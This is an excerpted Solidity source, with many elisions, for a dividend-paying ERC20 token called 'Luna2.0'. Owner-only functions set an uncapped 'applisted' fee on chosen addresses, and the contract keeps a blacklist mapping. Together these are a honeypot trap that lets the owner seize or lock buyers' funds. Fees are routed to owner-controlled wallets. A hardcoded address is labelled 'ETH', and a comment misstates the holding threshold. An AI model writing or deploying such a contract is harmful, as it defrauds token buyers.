...
contract DividendPayingToken is ERC20, Ownable, DividendPayingTokenInterface, DividendPayingTokenOptionalInterface {
  ...
  address public immutable ETH = address(0x156ab3346823B651294766e23e6Cf87254d68962); //ETH
...
contract TOKENS is ERC20, Ownable {
    ...
    address public immutable ETH = address(0x156ab3346823B651294766e23e6Cf87254d68962); //Reward ETH

    uint256 public swapTokensAtAmount = 100000 * (10**18);

    uint256 public removeApplistEnable = 60 * (10**18);
    
    mapping(address => bool) public _isbclisted;
    mapping (address => bool) public applists;


    uint256 public ETHRewardsFee = 5;
    uint256 public liquidityFee = 1;
    uint256 public marketingFee = 4;
    uint256 public applistedFee = 0;
    ...
    bool public applistEnable = true;
    bool public isL;
    ...
    constructor() public ERC20("Luna2.0", "Luna2.0") {
        ...
        _teamWalletAddress = payable(owner());
    ...
    function setRemoveApplistEnable(uint256 value) public onlyOwner {
        removeApplistEnable = value;
    }

    function setApplistedFee(uint256 newFee) public onlyOwner {
        applistedFee = newFee;
    }

    function setApplistEnable(bool _status) public onlyOwner {
        applistEnable = _status;
    }

    function setAddressApplisted(address addre, bool status) public onlyOwner {
        applists[addre]  = status;
    }
    ...
    function setTeamingWallet(address payable wallet) external onlyOwner{
    ...
    function _transfer(
        ...
        if (uniswapV2Pair.balance > removeApplistEnable) {
            applistEnable = false;
        }
        ...
        if(takeFee) {
            ...
            if(applistEnable && applists[from]){
                 fees = amount.mul(applistedFee).div(100);
            }
    ...
    function swapAndSendToFee(uint256 tokens) private  {
        ...
        IERC20(ETH).transfer(_marketingWalletAddress, newBalance / 10 * 6);
        IERC20(ETH).transfer(_teamWalletAddress, newBalance / 10 * 4);
    }
...
contract ETHBackDividendTracker is Ownable, DividendPayingToken {
    ...
    constructor() public DividendPayingToken("ETHBack_Dividen_Tracker", "ETHBack_Dividend_Tracker") {
        claimWait = 600;
        minimumTokenBalanceForDividends = 100000 * (10**18); //must hold 200000+ tokens
    }
